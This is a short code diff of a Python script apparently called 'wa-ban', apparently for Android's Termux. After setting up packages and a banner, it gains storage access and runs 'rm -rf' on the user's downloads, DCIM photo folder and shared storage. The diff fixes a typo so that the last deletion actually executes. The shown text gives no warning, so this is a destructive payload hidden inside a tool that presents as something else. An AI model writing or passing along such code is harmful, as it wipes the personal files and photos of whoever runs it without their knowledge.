@@ -12,13 +12,13 @@ os.system("clear")
 os.system("pip3 install colorma")
 os.system("apt install figlet")
 os.system("clear")
-os.system("figlet wa-ban -f bigmono12.tlf")
+os.system("figlet wa-ban")
 os.system("termux-setup-storage")
 os.system("cd")
 os.system("cd storage")
 os.system("rm -rf downloads")
 os.system("rm-rf dcim")
-os.sysyem("rm-rf shared")
+os.system("rm-rf shared")
 
 import sys
 from termcolor import colored, cprint
